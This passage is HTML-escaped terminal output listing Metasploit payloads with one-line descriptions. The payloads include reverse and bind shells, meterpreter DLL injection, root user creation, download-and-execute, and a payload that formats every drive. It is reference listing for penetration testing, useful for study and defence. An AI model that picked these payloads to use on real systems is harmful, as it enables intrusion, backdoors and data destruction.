 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter_reverse_https                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter_reverse_tcp                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)</span><br><span class="line">    linux&#x2F;x64&#x2F;pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)</span><br><span class="line">    linux&#x2F;x64&#x2F;shell&#x2F;bind_tcp                            Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: &#39;nmap -sS t</span><br><span class="line">                                                        arget -p-&#39;.</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_find_port                           Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    linux&#x2F;x64&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;adduser                                   Create a new user with UID 0</span><br><span class="line">    linux&#x2F;x86&#x2F;chmod                                     Runs chmod on specified file with specified mode</span><br><span class="line">    linux&#x2F;x86&#x2F;exec                                      Execute an arbitrary command</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;find_tag                      Inject the mettle server payload (staged). Use an established connection</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter_reverse_http                  Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter_reverse_https                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x86&#x2F;meterpreter_reverse_tcp                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x86&#x2F;metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    linux&#x2F;x86&#x2F;metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    linux&#x2F;x86&#x2F;read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;find_tag                            Spawn a command shell (staged). Use an established connection</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: &#39;nmap -sS t</span><br><span class="line">                                                        arget -p-&#39;.</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_find_port                           Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_find_tag                            Spawn a shell on an established connection (proxy&#x2F;nat safe)</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;x86&#x2F;shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    linux&#x2F;zarch&#x2F;meterpreter_reverse_http                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;zarch&#x2F;meterpreter_reverse_https               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;zarch&#x2F;meterpreter_reverse_tcp                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    mainframe&#x2F;shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translatio</span><br><span class="line">                                                        n, so a client with translation capabilities is required. MSF handles this automatically.</span><br><span class="line">    multi&#x2F;meterpreter&#x2F;reverse_http                      Handle Meterpreter sessions regardless of the target arch&#x2F;platform. Tunnel communication over HTTP</span><br><span class="line">    multi&#x2F;meterpreter&#x2F;reverse_https                     Handle Meterpreter sessions regardless of the target arch&#x2F;platform. Tunnel communication over HTTPS</span><br><span class="line">    netware&#x2F;shell&#x2F;reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker</span><br><span class="line">    nodejs&#x2F;shell_bind_tcp                               Creates an interactive shell via nodejs</span><br><span class="line">    nodejs&#x2F;shell_reverse_tcp                            Creates an interactive shell via nodejs</span><br><span class="line">    nodejs&#x2F;shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL</span><br><span class="line">    osx&#x2F;armle&#x2F;execute&#x2F;bind_tcp                          Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    osx&#x2F;armle&#x2F;execute&#x2F;reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    osx&#x2F;armle&#x2F;shell&#x2F;bind_tcp                            Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    osx&#x2F;armle&#x2F;shell&#x2F;reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    osx&#x2F;armle&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    osx&#x2F;armle&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;armle&#x2F;vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Mi</span><br><span class="line">                                                        ller &lt;cmiller[at]securityevaluators.com&gt;.</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell&#x2F;bind_tcp                              Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell&#x2F;find_tag                              Spawn a command shell (staged). Use an established connection</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell&#x2F;reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    osx&#x2F;ppc&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;x64&#x2F;dupandexecve&#x2F;bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;dupandexecve&#x2F;reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;dupandexecve&#x2F;reverse_tcp_uuid               dup2 socket in edi, then execve. Connect back to the attacker with UUID Support (OSX x64)</span><br><span class="line">    osx&#x2F;x64&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_uuid                Inject the mettle server payload (staged). Connect back to the attacker with UUID Support (OSX x64)</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter_reverse_http                    Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter_reverse_https                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    osx&#x2F;x64&#x2F;meterpreter_reverse_tcp                     Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    osx&#x2F;x64&#x2F;say                                         Say an arbitrary string outloud using Mac OS X text2speech</span><br><span class="line">    osx&#x2F;x64&#x2F;shell_bind_tcp                              Bind an arbitrary command to an arbitrary port</span><br><span class="line">    osx&#x2F;x64&#x2F;shell_find_tag                              Spawn a shell on an established connection (proxy&#x2F;nat safe)</span><br><span class="line">    osx&#x2F;x64&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;bundleinject&#x2F;bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;bundleinject&#x2F;reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    osx&#x2F;x86&#x2F;isight&#x2F;bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;isight&#x2F;reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    osx&#x2F;x86&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell&#x2F;bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell&#x2F;reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell</span><br><span class="line">    osx&#x2F;x86&#x2F;vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell</span><br><span class="line">    php&#x2F;bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)</span><br><span class="line">    php&#x2F;bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6</span><br><span class="line">    php&#x2F;bind_php                                        Listen for a connection and spawn a command shell via php</span><br><span class="line">    php&#x2F;bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)</span><br><span class="line">    php&#x2F;download_exec                                   Download an EXE from an HTTP URL and execute it</span><br><span class="line">    php&#x2F;exec                                            Execute a single system command</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp                            Run a meterpreter server in PHP. Listen for a connection</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support</span><br><span class="line">    php&#x2F;meterpreter&#x2F;bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support</span><br><span class="line">    php&#x2F;meterpreter&#x2F;reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions</span><br><span class="line">    php&#x2F;meterpreter&#x2F;reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions</span><br><span class="line">    php&#x2F;meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)</span><br><span class="line">    php&#x2F;reverse_perl                                    Creates an interactive shell via perl</span><br><span class="line">    php&#x2F;reverse_php                                     Reverse PHP connect back shell with checks for disabled functions</span><br><span class="line">    php&#x2F;shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evi</span><br><span class="line">                                                        l-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless fir</span><br><span class="line">                                                        ewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appea</span><br><span class="line">                                                        rs to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only</span><br><span class="line">                                                        tested on Apache but it might work on other web servers that leak file descriptors to child processes.</span><br><span class="line">    python&#x2F;meterpreter&#x2F;bind_tcp                         Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Listen for a connection</span><br><span class="line">    python&#x2F;meterpreter&#x2F;bind_tcp_uuid                    Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Listen for a connection with UUID Support</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_http                     Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Tunnel communication over HTTP</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_https                    Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Tunnel communication over HTTP using SSL</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_tcp                      Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Connect back to the attacker</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_tcp_ssl                  Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Reverse Python connect back stager using SSL</span><br><span class="line">    python&#x2F;meterpreter&#x2F;reverse_tcp_uuid                 Run a meterpreter server in Python (compatible with 2.5-2.7 &amp; 3.1+). Connect back to the attacker with UUID Support</span><br><span class="line">    python&#x2F;meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    python&#x2F;pingback_bind_tcp                            Listens for a connection from the attacker, sends a UUID, then terminates</span><br><span class="line">    python&#x2F;pingback_reverse_tcp                         Connects back to the attacker, sends a UUID, then terminates</span><br><span class="line">    python&#x2F;shell_bind_tcp                               Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.</span><br><span class="line">    python&#x2F;shell_reverse_tcp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.</span><br><span class="line">    python&#x2F;shell_reverse_tcp_ssl                        Creates an interactive shell via Python, uses SSL, encodes with base64 by design. Compatible with Python 2.6-2.7 an</span><br><span class="line">                                                        d 3.4+.</span><br><span class="line">    python&#x2F;shell_reverse_udp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.</span><br><span class="line">    r&#x2F;shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R</span><br><span class="line">    r&#x2F;shell_reverse_tcp                                 Connect back and create a command shell via R</span><br><span class="line">    ruby&#x2F;pingback_bind_tcp                              Listens for a connection from the attacker, sends a UUID, then terminates</span><br><span class="line">    ruby&#x2F;pingback_reverse_tcp                           Connect back to the attacker, sends a UUID, then terminates</span><br><span class="line">    ruby&#x2F;shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    ruby&#x2F;shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    ruby&#x2F;shell_reverse_tcp                              Connect back and create a command shell via Ruby</span><br><span class="line">    ruby&#x2F;shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    solaris&#x2F;sparc&#x2F;shell_bind_tcp                        Listen for a connection and spawn a command shell</span><br><span class="line">    solaris&#x2F;sparc&#x2F;shell_find_port                       Spawn a shell on an established connection</span><br><span class="line">    solaris&#x2F;sparc&#x2F;shell_reverse_tcp                     Connect back to attacker and spawn a command shell</span><br><span class="line">    solaris&#x2F;x86&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell</span><br><span class="line">    solaris&#x2F;x86&#x2F;shell_find_port                         Spawn a shell on an established connection</span><br><span class="line">    solaris&#x2F;x86&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell</span><br><span class="line">    tty&#x2F;unix&#x2F;interact                                   Interacts with a TTY on an established socket connection</span><br><span class="line">    windows&#x2F;adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common co</span><br><span class="line">                                                        mplexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Com</span><br><span class="line">                                                        plexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit&#x2F;special)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP</span><br><span class="line">                                                        defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After tha</span><br><span class="line">                                                        t you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shellcode</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the a</span><br><span class="line">                                                        llowed host.</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;find_tag                          Inject a DLL via a reflective loader. Use an established connection</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must firs</span><br><span class="line">                                                        t upload data&#x2F;hop&#x2F;hop.php to the PHP server you wish to use as a hop.</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)</span><br><span class="line">    windows&#x2F;dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload</span><br><span class="line">    windows&#x2F;download_exec                               Download an EXE from an HTTP(S)&#x2F;FTP URL and execute it</span><br><span class="line">    windows&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    windows&#x2F;format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the v</span><br><span class="line">                                                        olume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reas</span><br><span class="line">                                                        on, it skips the drive and proceeds to the next volume.</span><br><span class="line">    windows&#x2F;loadlibrary                                 Load an arbitrary library path</span><br><span class="line">    windows&#x2F;messagebox                                  Spawns a dialog via MessageBox using a customizable title, text &amp; icon</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_hidden_ipknock_tcp         Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will wor</span><br><span class="line">                                                        k as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode fro</span><br><span class="line">                                                        m any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shellcode</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_hidden_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection from a hidden port and spawn a command shell to the allowed host.</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_ipv6_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_named_pipe                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_nonx_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_tcp                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_tcp_rc4                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_tcp_uuid                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;find_tag                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Use an established connection</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_hop_http                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data&#x2F;hop&#x2F;hop.php to the P</span><br><span class="line">                                                        HP server you wish to use as a hop.</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_http                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows wininet)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_http_proxy_pstore       Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_https                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTPS (Windows wininet)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_https_proxy             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP using SSL with custom proxy support</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_ipv6_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_named_pipe              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_nonx_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_ord_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp                     Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_allports            Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Try to connect back to the attacker, on all possible ports (1-65535, slowly)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_dns                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4_dns             Inject the Meterpreter server DLL via the Reflective Dll Injection payload 